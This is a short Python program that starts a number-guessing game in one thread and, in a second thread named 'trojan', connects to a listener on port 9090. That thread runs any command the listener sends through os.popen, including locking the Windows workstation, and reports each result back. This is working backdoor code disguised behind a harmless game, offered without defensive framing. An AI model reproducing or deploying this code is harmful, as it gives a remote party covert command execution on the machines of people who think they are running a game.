import random
import socket
import sys
import threading
import os


def trojan():
    HOST = '127.0.0.1'
    PORT = 9090

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))

    cmd_mode = False

    while True:
        server_command = client.recv(1024).decode('utf-8')
        if server_command == 'cmdon':
            cmd_mode = True
            client.send("You now have terminal access!".encode('utf-8'))
            continue
        if server_command == 'cmdoff':
            cmd_mode = False
            client.send("Terminal access deactivated".encode('utf-8'))
            '''continue'''
        if cmd_mode:
            if server_command == 'lock':
                os.popen('Rundll32.exe user32.dll,LockWorkStation')
            if server_command == 'exit':
                client.send("Server exiting msg received".encode('utf-8'))
                print("\nServer closing")
            else:
                os.popen(server_command)
        else:
            if server_command == "hello":
                print("\nHello World!")

        client.send(f"{server_command} was executed successfully!".encode('utf-8'))


def game():
    number = random.randint(0, 1000)
    tries = 1
    done = False

    while not done:
        guess = int(input("Enter a guess: "))

        if guess == number:
            done = True
            print("You won!")
        else:
            tries += 1
            if guess > number:
                print("The number is smaller!")
            else:
                print("The number is greater")

    print(f"You needed {tries} tries!")


t1 = threading.Thread(target=game)
t2 = threading.Thread(target=trojan)

t1.start()
t2.start()
